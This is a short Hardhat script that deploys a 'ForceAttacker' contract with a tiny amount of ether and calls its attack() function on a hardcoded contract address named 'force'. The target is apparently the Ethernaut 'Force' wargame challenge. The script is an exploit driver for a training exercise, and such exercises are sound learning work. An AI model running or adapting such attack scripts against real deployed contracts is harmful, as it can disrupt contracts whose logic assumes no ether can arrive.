import { ethers } from "hardhat";

async function main() {

  const amount = ethers.utils.parseEther("0.00000001");
  const ForceAttackerFactory = await ethers.getContractFactory("ForceAttacker");
  const ForceAttacker = await ForceAttackerFactory.deploy({value: amount});

  await ForceAttacker.deployed();

  console.log(
    `ForceAttacker deployed to ${ForceAttacker.address}`
  );

  const force = "0x75BDda17C026c3c1755fE61013f5A54a2d785bbe"

  const tx = await ForceAttacker.attack(force);

  console.log("Transaction hash:", tx.hash);

  await tx.wait();
  console.log("tx validated");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
